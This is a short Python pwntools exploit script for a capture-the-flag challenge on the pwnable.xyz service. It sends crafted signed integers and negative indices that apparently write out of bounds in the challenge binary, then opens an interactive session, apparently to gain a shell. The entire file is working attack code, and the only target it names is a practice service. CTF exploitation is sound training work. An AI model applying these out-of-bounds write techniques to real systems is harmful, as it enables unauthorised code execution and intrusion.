from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30003

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
# args.DEBUG = True

def conn():
    if args.DEBUG:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    elif args.LOCAL:
        return process(exe.path)
    else:
        return remote(HOST, PORT)

def to_signed(x, bits):
    if x >= (1 << (bits - 1)):
        x -= 1 << bits

    return x

def main():
    r  = conn()

    # Have to make it signed because C can't read a number this big with %ld
    first = to_signed(0xb500000000000000, 64)
    r.sendline(f"{first} 0 -6".encode())

    second = 0x0b000000
    r.sendline(f"{second} 0 -5".encode())
    
    r.sendline(b"palle")    
    r.interactive()

if __name__ == "__main__":
    main()
